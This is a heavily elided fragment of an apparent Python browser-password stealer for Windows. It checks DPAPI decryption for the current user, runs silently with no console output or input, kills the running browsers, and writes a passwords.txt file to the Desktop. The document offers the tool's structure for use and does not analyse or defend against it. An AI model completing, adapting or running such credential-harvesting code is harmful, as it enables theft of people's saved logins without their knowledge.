...
# ============================================================
# DESKTOP PATH FOR ALL OUTPUT FILES
# ============================================================
...
if not test_dpapi():
    log("DPAPI test failed – wrong user.")
    sys.exit(1)
else:
    log("DPAPI OK.")
...
# ============================================================
# MAIN (SILENT – NO CONSOLE OUTPUT, NO INPUT)
# ============================================================
def main():
    # Kill browsers
    for b in BROWSERS:
    ...
    try:
        ...
        log(f"Failed to save passwords.txt: {e}")
